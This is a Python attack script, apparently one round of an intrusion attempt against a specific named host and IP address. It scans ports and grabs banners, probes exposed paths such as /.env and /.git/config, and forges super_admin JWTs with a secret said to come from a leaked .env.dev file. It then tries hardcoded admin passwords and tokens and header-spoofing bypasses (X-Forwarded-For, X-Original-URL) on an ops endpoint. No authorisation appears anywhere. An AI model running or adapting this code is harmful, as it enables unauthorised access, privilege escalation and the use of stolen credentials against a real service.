#!/usr/bin/env python3
# i29518 round E: port scan, misc unauth endpoints, auth-bypass battery on /v1/ops/me
import json,base64,subprocess,re,time,socket,hmac,hashlib
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
IP="124.223.170.146"; H="cloud-admin.lumiiai.cn"; START=time.time()
def _b(s):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)),flush=True)
def run(a,timeout=60):
    try:
        p=subprocess.run(a,capture_output=True,timeout=timeout); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def http(url,method="GET",body=None,headers=None,timeout=20,maxlen=200000,jar=None):
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-D","/tmp/hd","-w","\n__C__%{http_code}\n__T__%{content_type}"]
    for h in (headers or []): a+=["-H",h]
    if jar: a+=["-b",jar,"-c",jar]
    if body is not None:
        a+=["-X",method,"--data-binary", body if isinstance(body,str) else json.dumps(body)]
        if not any(h.lower().startswith("content-type") for h in (headers or [])): a+=["-H","Content-Type: application/json"]
    elif method!="GET": a+=["-X",method]
    a+=[url]
    rc,out,err=run(a,timeout=timeout+12)
    t=out.decode("utf-8","replace"); c="";ct=""
    m=re.search(r"\n__T__([^\n]*)",t)
    if m: ct=m.group(1); t=t[:m.start()]
    i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    try: hdr=open("/tmp/hd").read()
    except: hdr=""
    return {"code":c,"ct":ct,"body":t[:maxlen],"setcookie":[l for l in hdr.splitlines() if l.lower().startswith("set-cookie")]}
def b64u(x):
    if isinstance(x,str): x=x.encode()
    return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
def forge(secret,claims):
    hh=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    pp=b64u(json.dumps(claims,separators=(",",":")))
    sig=b64u(hmac.new(secret.encode(),(hh+"."+pp).encode(),hashlib.sha256).digest())
    return hh+"."+pp+"."+sig

# ---- port scan ----
ports=[22,80,443,3000,3001,3306,4000,4080,5000,5432,6379,7000,8000,8080,8788,8888,9000,9001,9090,9200,2375,27017,11211,5672,15672,3100,1420,5173,6001,8081]
openp={}
for p in ports:
    s=socket.socket(); s.settimeout(2.0)
    try:
        r=s.connect_ex((IP,p)); 
        if r==0: openp[p]=True
    except Exception: pass
    finally: s.close()
R("ports",sorted(openp.keys()))
# banner grab a couple
banners={}
for p in [3000,8000,8080,4080,8788,9000,3100]:
    if p in openp:
        rc,out,err=run(["curl","-s","-k","-m","8","-i","http://%s:%d/"%(IP,p)],timeout=15)
        banners[p]=out[:600].decode("utf-8","replace")
R("banners",banners)

# ---- misc unauth endpoints on 443 ----
misc={}
for p in ["/metrics","/api/metrics","/debug/pprof/","/debug/pprof/cmdline","/openapi.json","/v1/openapi.json","/v1/ops/openapi.json","/swagger","/swagger.json","/actuator","/actuator/health","/.git/config","/.env","/v1/ops/","/v1/","/v1/ops/login","/v1/ops/logout","/favicon.svg","/robots.txt","/sitemap.xml"]:
    r=http("https://%s%s"%(H,p),timeout=15,maxlen=1200)
    misc[p]={"code":r["code"],"ct":r["ct"],"len":len(r["body"]),"body":r["body"][:400]}
R("misc",misc)

# ---- auth bypass battery on /v1/ops/me ----
S1="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="      # .env.dev JWT_SECRET
S2="ce9a4ded"  # placeholder prefix only, skip
claims_sets=[
 {"userId":"admin","sub":"admin","role":"super_admin","customer":"aro","exp":int(time.time())+86400},
 {"sub":"admin","userId":"00000000-0000-0000-0000-000000000000","role":"super_admin","positions":["super_admin"],"exp":int(time.time())+86400},
 {"uid":"admin","role":"super_admin","iat":int(time.time()),"exp":int(time.time())+86400},
]
ATOK="6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
bat={}
tests=[]
for i,c in enumerate(claims_sets):
    tk=forge(S1,c)
    tests += [("bearerS1_%d"%i,["Authorization: Bearer "+tk]),
              ("cookie_lumii_sessionS1_%d"%i,["Cookie: lumii_session="+tk]),
              ("cookie_ops_sessionS1_%d"%i,["Cookie: ops_session="+tk]),
              ("cookie_sessionS1_%d"%i,["Cookie: session="+tk]),
              ("cookie_opsAdminS1_%d"%i,["Cookie: ops_admin="+tk]),
              ("cookie_tokenS1_%d"%i,["Cookie: token="+tk])]
tests += [("bearer_admin_token",["Authorization: Bearer "+ATOK]),
          ("x_ops_token",["X-Ops-Token: "+ATOK]),
          ("x_admin_token",["X-Admin-Token: "+ATOK]),
          ("x_instance_id",["X-Instance-Id: 1","Authorization: Bearer "+ATOK]),
          ("basic_admin",["Authorization: Basic "+base64.b64encode(b"admin:iGIqnu4f8UGepPjBtQRt").decode()]),
          ("basic_admin_pif8",["Authorization: Basic "+base64.b64encode(b"admin:PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP").decode()]),
          ("forwarded",["X-Forwarded-For: 127.0.0.1","X-Real-IP: 127.0.0.1"]),
          ("xff_admin",["X-Forwarded-For: 127.0.0.1","X-Original-URL: /v1/ops/admins"])]
for name,hd in tests:
    r=http("https://%s/v1/ops/me"%H,headers=hd,timeout=15,maxlen=800)
    bat[name]={"code":r["code"],"body":r["body"][:300],"setcookie":r["setcookie"]}
R("bypass",bat)
# OPTIONS/CORS
r=http("https://%s/v1/ops/login"%H,"OPTIONS",headers=["Origin: https://evil.example","Access-Control-Request-Method: POST"],timeout=15,maxlen=800)
R("options",{"code":r["code"],"body":r["body"][:400]})
print("DONE",time.time()-START,flush=True)
